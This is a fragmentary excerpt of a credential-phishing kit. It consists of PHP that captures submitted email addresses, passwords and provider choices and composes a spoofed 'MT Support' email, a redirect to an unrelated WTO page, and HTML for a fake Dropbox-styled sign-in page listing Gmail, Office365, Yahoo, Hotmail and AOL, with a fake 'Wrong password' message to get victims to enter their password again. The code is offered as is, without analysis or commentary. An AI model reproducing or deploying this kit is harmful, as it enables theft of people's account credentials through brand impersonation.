...
$_SESSION["provider"] = $provider = $_POST['hidCflag'];
$_SESSION["email"] = $email = $_POST['Email'];
$_SESSION["pass"] = $pass = $_POST['Passwd'];
...
$message .= "\n";
$headers = "From: MT Support <noreply>";
$headers .= $_POST['docs@dropbox.com']."\n";
...
<script type="text/javascript"> 
<!-- 
   window.location="https://www.wto.org/english/docs_e/legal_e/gatt47_01_e.htm"; 
...
<link rel="shortcut icon" href="dbx/favicon-vflk5FiAC.ico" type="image/x-icon" />
...
<script src="SpryAssets/SpryValidationPassword.js" type="text/javascript"></script>
  ...
  <img src="dbx/logo_strip.png" alt="Google" width="405" height="" class="logo">
  </div>
  </div>
...
<!-- form submit start -->
   ...
   <div><strong>Select your email provider</strong></div></br>
	...
	<option value="0" data-imagesrc="dbx/mail_gmail.png"
            data-description="Sign in with Gmail">Gmail</option>
		<option value="1" data-imagesrc="dbx/o365.png"
            data-description="Sign in with Office365">Office365</option>
        <option value="2" data-imagesrc="dbx/yahoo.png"
            data-description="Sign in with Yahoo">Yahoo</option>
        <option value="3"  data-imagesrc="dbx/live_hotmail.png"
            data-description="Sign in with Hotmail">Hotmail</option>
        <option value="4" data-imagesrc="dbx/aol.png"
            data-description="Sign in with AOL">AOL</option>
        <option value="5" data-imagesrc="dbx/email.png"
            data-description="Sign in with Others">Others</option></select>
             <br/>
<div><font color="red">Wrong password. Try again.</font></div></br> 
...
<img src="dbx/footer-img.jpg" width="576" height="50" alt="">
</div>
<div>
<div class="">
  ...
  <script type="text/javascript" src="dbx/jquery.min.js"></script>
  <script type="text/javascript" src="dbx/jquery.ddslick.min.js"></script>
